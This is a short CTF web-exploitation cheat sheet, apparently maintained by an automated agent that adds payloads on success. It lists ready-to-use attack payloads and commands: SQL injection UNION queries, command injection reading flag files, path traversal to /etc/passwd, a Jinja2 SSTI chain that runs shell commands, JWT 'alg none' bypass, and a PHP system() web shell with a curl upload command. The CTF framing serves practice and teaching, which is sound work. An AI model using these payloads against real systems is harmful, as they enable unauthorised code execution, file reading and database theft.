# 🌐 Web CTF Speed Playbook

> **Scope**: XSS, SQLi, SSRF, IDOR, Auth Bypass, SSTI, LFI/Path Traversal, File Upload.

---

## ⚡ 1. Rapid Probe Decision Matrix (First 60s)

| Vulnerability Type | Trigger Signs / Inputs | 1st Payload to Test | Fast Tool Command |
|---|---|---|---|
| **SQL Injection** | Login fields, `?id=1`, search bars | `' OR 1=1-- -` or `1' UNION SELECT NULL--` | `sqlmap -u "<url>" --batch --dbs` |
| **Command Injection** | Ping test, IP inputs, PDF converters | `; cat /flag*` or `$(cat /flag.txt)` | `curl -X POST -d "ip=;cat /flag*" <url>` |
| **Path Traversal / LFI** | `?page=about.php`, file viewers | `../../../../flag.txt` or `../../../../etc/passwd` | `curl "<url>?page=../../../../flag.txt"` |
| **SSTI (Jinja2/Twig)** | Username reflected, `{{7*7}}` | `{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}` | Direct HTTP POST |
| **Auth Bypass / JWT** | Cookies, Bearer tokens | `{"alg": "none"}` or default `admin:admin` | `jwt.io` / custom python script |
| **File Upload** | Upload profile picture / documents | `.php`, `.phar`, `.phtml`, `.php5` with `<?php system($_GET['c']); ?>` | `curl -F "file=@shell.php" <url>` |
| **Hidden Route / Empty 200** | Target returns 200:0 for all standard paths | Parallel `xargs -P 20` curl with filter `[ "$r" != "200:0" ]` | `cat wordlist.txt \| xargs -P 20 -I{} curl ...` |

---

## 🎯 2. Proven Fast Payloads (Updated Automatically on Success)

- *SQLi (MySQL)*: `' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()-- -`
- *LFI (PHP Filter)*: `php://filter/convert.base64-encode/resource=flag.php`
- *Command Injection*: `127.0.0.1; cat /flag*`
- *Dummy 200 Response Bypass*: Filter out default length bytes `%{size_download}` to expose non-zero hidden endpoints immediately.

---

## ⚠️ 3. Failed Attempts & Avoidances (Learned Failures)

*(Auto-updated when an approach fails or times out so it is never repeated)*
- Avoid blind brute-forcing without wordlists under 100 lines.
- Avoid multi-stage XSS exfiltration if direct DOM extraction works.
- Avoid single-threaded curl requests on routing problems — always use `xargs -P 20` or `ffuf`.
- **Decoy / Fake Flag Filtering**: Watch out for fake flags or troll responses (`fake_flag`, `decoy_egg`, `v1/v2` traps). Verify the payload path specifically targets Version 3 (V3) assets or official flag format wrappers (`UCSI{...}`).
